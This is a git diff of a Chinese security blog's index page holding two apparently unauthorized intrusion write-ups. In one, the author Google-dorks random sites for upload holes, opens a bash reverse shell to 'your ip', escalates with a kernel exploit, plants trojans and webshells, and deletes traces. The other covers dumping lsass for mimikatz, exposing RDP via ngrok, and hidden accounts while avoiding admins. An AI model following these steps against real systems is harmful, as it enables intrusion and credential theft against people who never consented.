@@ -143,17 +143,96 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-记一次渗透测试实战" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-记一次实战渗透过程中的知识点总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/21/记一次实战渗透过程中的知识点总结/">记一次实战渗透过程中的知识点总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/21/记一次实战渗透过程中的知识点总结/" class="archive-article-date">
+  	<time datetime="2018-09-21T02:30:01.352Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<hr>
-<h2 id="记一次渗透测试实战"><a href="#记一次渗透测试实战" class="headerlink" title="记一次渗透测试实战"></a>记一次渗透测试实战</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前一直没搞过内网渗透实战，了解的相关知识仅停留在理论层次，最近搞了一波，写个笔记记录一下。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。</p>
+<h2 id="0x01-知识点一"><a href="#0x01-知识点一" class="headerlink" title="0x01 知识点一"></a>0x01 知识点一</h2><p>拿下目标shell后发现直接是system权限。<br><img src="https://i.imgur.com/zawL4Ap.png" alt=""><br><br>system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被管理员发现。这里我选择的是传一个msf码子弹个meterpreter sessions回来。然而码子一传上去就被杀了，<code>tasklist /svc</code>发现可疑进程查询后得知是一款趋势科技的杀软。<code>kill pid</code>结束不掉，怎么办？免杀呗。经过免杀处理后能成功上传，正向反向都试了一遍，但是session还是始终弹不回来。大概就是下面这个样子，始终到不了ESTABLISHED状态。由于之前没保存图，又懒得再去搞一遍就这么描述一下吧。<img src="https://i.imgur.com/YYI4l5T.png" alt=""><br>这里我讲一下为什么我想弹meterpreter回来。主要是为了方便打内网和读密码。既然msf行不通那就只能变换思路。怎么办呢？无奈，只好去新建一个隐藏账户了，然而问题又来了，虽然执行命令没回显基本上是成功了，但是最后去连3389显示用户不存在。<img src="https://i.imgur.com/V1lBuSU.png" alt=""><br>是什么原因导致这种情况,我们把原因归结到杀软上，以为可能是杀软限制了执行与用户相关操作的命令，实际原因等我们最后登录上3389后发现并不是，这里是一个坑，还有怎么登上3389的文章最后再提。咋办？传mimikatz？失败，传不上。然后队友想到了一个好办法，mimikatz是从内存中读密码的。那么我们能不能把它的内存给导出来？最后找到一款绝对免杀的工具（微软官方工具）prodump，上传prodump.exe执行命令<code>prodump.exe -accepteula -ma lsass.exe lsass.dmp</code>成功导出内存。<img src="https://i.imgur.com/SfE6vAP.png" alt=""><br><br><img src="https://i.imgur.com/jZ19U6Y.png" alt=""><br>下载到本地用mimikatz读取。把<code>lsass.dmp</code>放到mimikatz目录下，执行命令<code>sekurlsa::minidmp lsass.dmp</code>和<code>sekurlsa::logonPasswords full</code>即可读出密码。直接读出了明文密码。<img src="https://i.imgur.com/5I8ypg2.png" alt=""></p>
+<h2 id="0X02-知识点二"><a href="#0X02-知识点二" class="headerlink" title="0X02 知识点二"></a>0X02 知识点二</h2><p>密码拿到了，连接3389试一下。然而，他只允许内网连接，尝试了用正向代理的方式，没成功，最后用了一款反向代理工具ngrok直接把它3389映射了出来。<br><img src="https://i.imgur.com/Ixwr85M.png" alt=""><br><br>ngrok需要到它的官网用邮箱注册，因为他实际上并不会验证，推荐使用临时邮箱。将ngrok上传到目标主机上。首先到ngrok官网上找到你的token。<br><img src="https://i.imgur.com/9F8Qz9V.png" alt=""><br><br>然后在目标主机上执行命令<code>ngrok.exe authtoken your token</code><br><img src="https://i.imgur.com/Z0lxcse.png" alt=""><br><br>然后在执行<code>ngrok.exe tcp 3389</code>即可，现在它的3389已经映射出来了。可以直接连接了，在连接之前要先查询下管理员是否在线使用命令<code>quser</code>即可。<img src="https://i.imgur.com/ArEn19O.png" alt=""><br>如果在线的话，贸然登录会把管理员给挤下去很容易被发现。这里我就贴一张之前登录成功的图吧。<br><img src="https://i.imgur.com/HzEoe1N.png" alt="">连接3389的方式，进入你的ngrok找到status复制里面的URL即可。<img src="https://i.imgur.com/a9QK5AJ.png" alt=""></p>
+<h2 id="0x03-写在后面的话"><a href="#0x03-写在后面的话" class="headerlink" title="0x03 写在后面的话"></a>0x03 写在后面的话</h2><p>最后登录进去是个什么情况了，发现他有密码复杂度和长度要求。所以我们之前添加用户没有成功并不是因为杀软的阻拦，以后添加用户密码一定得设置的复杂点。另外这个内网很大。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/21/记一次实战渗透过程中的知识点总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-记一次渗透测试实战" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/06/记一次渗透测试实战/">记一次渗透测试实战</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/06/记一次渗透测试实战/" class="archive-article-date">
+  	<time datetime="2018-09-06T05:52:29.881Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前一直没搞过内网渗透实战，了解的相关知识仅停留在理论层次，最近搞了一波，写个笔记记录一下。</p>
 <h3 id="0X01-突破边界拿下shell"><a href="#0X01-突破边界拿下shell" class="headerlink" title="0X01 突破边界拿下shell"></a>0X01 突破边界拿下shell</h3><p>周末在家闲着没事突然就想搞事了，然后使用Google hack语法输入<code>inurl:xxx.xxx.xxx/upload</code>批量搜索可能存在上传点的网站，试了好几个最后找到一个可利用的上传点。<br><img src="https://i.imgur.com/UGa5YoQ.png" alt=""><br><br><img src="https://i.imgur.com/ygWmc6Q.png" alt=""><br><br>注：涉及敏感信息，图片仅供参考，具体内容自行填充。</p>
 <h3 id="0X02-反弹shell-amp-提权"><a href="#0X02-反弹shell-amp-提权" class="headerlink" title="0X02 反弹shell&amp;提权"></a>0X02 反弹shell&amp;提权</h3><p>Linux下需要把shell反弹出来以方便我们操作，但是目标主机上既没有nc也没有python，查询相关资料后尝试了一下利用bash弹shell。需要一台公网服务器，使用命令<code>bash -i &gt;&amp; /dev/tcp/your ip/1234 0&gt;&amp;1</code>公网服务器使用命令<code>nc -lvp 1234</code>监听1234端口<img src="https://i.imgur.com/GqVMiQx.png" alt=""><br><br><br><img src="https://i.imgur.com/uj7cqsG.png" alt=""><br><br><br>现在shell已经反弹出来了，使用<code>id</code>命令查看当前权限，发现仅为Apache，使用<br><code>uname -a</code>查看内核版本,发现服务器内核版本为2.6.31.5-127.fc12.1686<br><br><img src="https://i.imgur.com/pHbcXdP.png" alt=""><br><br>在exploit-db中搜索此版本的相关漏洞，<br>经过多次尝试，发现了下面这个exp来提升权限。<br><br><a href="https://www.exploit-db.com/exploits/15285/" target="_blank" rel="noopener">Linux Kernel 2.6.36-rc8 - ‘RDS Protocol’ Local Privilege Escalation</a><br><br>然而问题又来了，目标主机上没有gcc，怎么办?只能撞撞运气尝试在本地编译好，再传到目标主机上去执行。本地编译好exp后传到目标主机TMP路径下，执行命令<code>chmod 777 a</code>赋予exp执行权限，然后执行<code>./a</code>获取到root权限。<br><img src="https://i.imgur.com/QafgvgI.png" alt=""><br><br></p>
-<h3 id="0X03-横向渗透撸内网"><a href="#0X03-横向渗透撸内网" class="headerlink" title="0X03 横向渗透撸内网"></a>0X03 横向渗透撸内网</h3><p>发现目标主机有内网环境，个人比较喜欢用msf，于是生成了个msf木马上传执行获取到一个meterpretershell。这里需要注意的是生成木马时LHOST填你的服务器公网ip，设置msf监听时LHOST需要填你服务器的内网ip。<br><img src="https://i.imgur.com/0GEhpnI.png" alt=""><br><br><br>在meterpretershell里执行<code>run autoroute -s 10.1.1.0/24</code>添加路由扫内网445。发现一台内网机器存在ms_17_010但是session弹不回来，尴尬。<br><img src="https://i.imgur.com/U0HCe5B.png" alt=""><br><br><br>僵硬，变换思路在边界服务器上寻找有价值的可利用信息。最后发现了几个password.txt和一个批量更新密码的脚本，找到一个长得像管路员的密码。这里不得不说一下在内网渗透中信息收集的重要性，这个密码简直太给力了。<br><img src="https://i.imgur.com/TW3roh5.png" alt=""><br><br>因为是内网，所以得用代理工具把本机代理进去，这里我用的是reGeorg-master，上传tunnel.nosocket.php到网站目录下，配合Proxifier进行全局代理（Linux下用proxychains)。<br>用这个密码登录上了受害主机的ssh，ssh都拿到了，接下来把该删掉的东西都删掉。<br><br><br>扫描内网机器10.1.1.17发现开了ftp，用上面那个密码登录进去了，就是这么巧。然后ftp传马，先传了个大马。结果发现PHP版本太老了，然后上了个小马，菜刀连接。直接system权限。<img src="https://i.imgur.com/ajuB0PU.png" alt=""><br><br><img src="https://i.imgur.com/ceXEcXE.png" alt=""><br>发现没开3389，使用命令<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>一键开启远程桌面。建立隐藏账户，成功连入远程桌面。<img src="https://i.imgur.com/dMHWkUQ.jpg" alt=""></p>
+<h3 id="0X03-横向渗透撸内网"><a href="#0X03-横向渗透撸内网" class="headerlink" title="0X03 横向渗透撸内网"></a>0X03 横向渗透撸内网</h3><p>发现目标主机有内网环境，个人比较喜欢用msf，于是生成了个msf木马上传执行获取到一个meterpretershell。这里需要注意的是生成木马时LHOST填你的服务器公网ip，设置msf监听时LHOST需要填你服务器的内网ip。<br><img src="https://i.imgur.com/0GEhpnI.png" alt=""><br><br><br>在meterpretershell里执行<code>run autoroute -s 10.1.1.0/24</code>添加路由扫内网445。发现一台内网机器存在ms_17_010但是session弹不回来，尴尬。<br><img src="https://i.imgur.com/U0HCe5B.png" alt=""><br><br><br>僵硬，变换思路在边界服务器上寻找有价值的可利用信息。最后发现了几个password.txt和一个批量更新密码的脚本，找到一个长得像管路员的密码。这里不得不说一下在内网渗透中信息收集的重要性，这个密码简直太给力了。<br><br><img src="https://i.imgur.com/TW3roh5.png" alt=""><br><br>因为是内网，所以得用代理工具把本机代理进去，这里我用的是reGeorg-master，上传tunnel.nosocket.php到网站目录下，配合Proxifier进行全局代理（Linux下用proxychains)。<br>用这个密码登录上了受害主机的ssh，ssh都拿到了，接下来把该删掉的东西都删掉。<br><br><br>扫描内网机器10.1.1.17发现开了ftp，用上面那个密码登录进去了，就是这么巧。然后ftp传马，先传了个大马。结果发现PHP版本太老了，然后上了个小马，菜刀连接。直接system权限。<img src="https://i.imgur.com/ajuB0PU.png" alt=""><br><br><img src="https://i.imgur.com/ceXEcXE.png" alt=""><br>发现没开3389，使用命令<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>一键开启远程桌面。建立隐藏账户，成功连入远程桌面。<img src="https://i.imgur.com/dMHWkUQ.jpg" alt=""></p>
 <h3 id="0X04写在后面的话"><a href="#0X04写在后面的话" class="headerlink" title="0X04写在后面的话"></a>0X04写在后面的话</h3><p>第一次从外网渗透到内网，盯了三天终于撸下一台，感觉这个内网还有的撸，有时间在继续搞。</p>
 
       
@@ -244,72 +323,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/21/getshell总结/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-后渗透阶段的权限维持" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/19/后渗透阶段的权限维持/">后渗透阶段的权限维持</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/19/后渗透阶段的权限维持/" class="archive-article-date">
-  	<time datetime="2018-08-19T13:06:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就显得很重要了。<br>在windows主机中，我总结了下面几种权限维持的方法，不足之处还望各位大佬斧正。</p>
-<h2 id="添加影子账户"><a href="#添加影子账户" class="headerlink" title="添加影子账户"></a>添加影子账户</h2><p>影子账户可以理解为和主体一模一样但是又看不见的账户，其隐蔽性较好，只能在注册表里面看到。</p>
-<p>首先，我们需要创建一个隐藏账号<code>OMG$</code>使用命令 <code>net user OMG$ /add</code> 即可。</p>
-<p>注：隐藏账户是指在使用 <code>net user</code> 命令下看不到的账户。<br><img src="/image001.png" alt="1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/19/后渗透阶段的权限维持/">展开全文 >></a>
         </p>
       
 
